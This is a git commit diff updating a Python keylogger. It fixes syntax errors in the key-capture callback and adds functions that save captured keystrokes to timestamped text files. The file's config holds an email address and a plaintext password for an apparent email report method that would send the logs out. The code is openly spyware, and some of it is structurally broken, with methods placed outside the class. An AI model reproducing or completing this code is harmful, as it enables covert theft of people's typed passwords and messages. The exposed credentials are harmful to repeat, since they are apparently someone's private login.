f836f59fe8fdc6e231bcb3299357bd9d0534539d
wavymejti <mateusztheszymkowiak@gmail.com>
2024-10-02 12:00:24 +0200

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -9,6 +9,7 @@ SEND_REPORT_EVERY = 60
 EMAIL_ADDRESS = 'mateusz.szymkowiak@proton.me'
 EMAIL_PASSWORD = 'SoniaDog2137?'
 
+
 class Keylogger:
     def __init__(self, interval, report_method="email"):
         self.interval = interval
@@ -17,19 +18,30 @@ class Keylogger:
         self.start_dt = datetime.now()
         self.end_dt = datetime.now()
 
+
 def callback(self, event):
     name = event.name
     if len(name) > 1:
-        if name == "space"
+        if name == "space":
 
             name = " "
         elif name == "enter":
             name = "[ENTER]\n"
         elif name == "decimal":
             name = "."
-        else
+        else:
             name = name.replace(" ", "_")
             name = f"[{name.upper()}]"
             self.log += name
 
-            
+
+def update_filename(self):
+    start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
+    end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
+    self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
+
+
+def report_to_file(self):
+    with open(f"{self.filename}.txt", "w") as f:
+        print(self.log, file=f)
+    print(f"[+] Saved {self.filename}.txt")
